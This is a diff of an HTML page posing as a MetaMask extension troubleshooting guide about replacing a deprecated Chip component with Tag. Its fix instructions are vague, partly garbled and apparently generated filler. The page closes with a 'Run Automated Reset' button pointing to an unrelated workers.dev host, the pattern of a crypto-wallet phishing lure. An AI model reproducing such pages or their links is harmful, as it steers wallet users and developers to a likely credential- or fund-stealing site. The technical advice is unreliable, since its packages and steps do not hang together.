@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Replace Deprecated Chip Component With Tag F</title>
 <style>
     body {
-        font-family: sans-serif;
+        font-family: BlinkMacSystemFont;
         background: #0a0c10;
         color: #ddd;
         padding: 20px;
@@ -25,7 +25,7 @@
     }
     a { color: #00adb5; }
     .btn {
-        background: #cf6679;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,28 +41,31 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters an error message indicating that the Chip component is deprecated and needs to be replaced with the Tag component from the component-library in the Metamask extension.</li>
+<li>The Metamask extension is displaying a warning message indicating that the Chip component is deprecated and should be replaced with the Tag component from the component-library.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs because the Chip component is no longer supported and has been replaced by the Tag component in the component-library, which is a more efficient and up-to-date solution for the ETH ecosystem.</li>
+<li>The error occurs because the Chip component is no longer supported in the latest version of the component-library, and the Metamask extension is still using it, resulting in compatibility issues.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Update the import statement to use the Tag component: </li>
-<li>Replace <code>import { Chip } from '@material-ui/core';</code> with <code>import { Tag } from '@component-library/tag';</code></li>
-<li>Update the component usage to match the new Tag component API</li>
-<li>Verify that all dependencies are up-to-date and compatible with the new component</li>
+<li>Update the component-library to the latest version to ensure compatibility with the Metamask extension.</li>
+<li>Replace all instances of the Chip component with the Tag component in the code.</li>
+<li>Verify that the new Tag component is properly configured and styled to match the original Chip component.</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>npm<span class="w"> </span>install<span class="w"> </span>@component-library/tag
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;dependencies&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;component-library&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;^2.0.0&quot;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 
 <p>Consider utilizing an external console to streamline the debugging process.</p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Node.js installed on the system</li>
-<li>npm or yarn package manager</li>
-<li>Metamask extension codebase access</li>
+<li>Yarn or npm package manager installed</li>
+<li>Latest version of the component-library installed</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
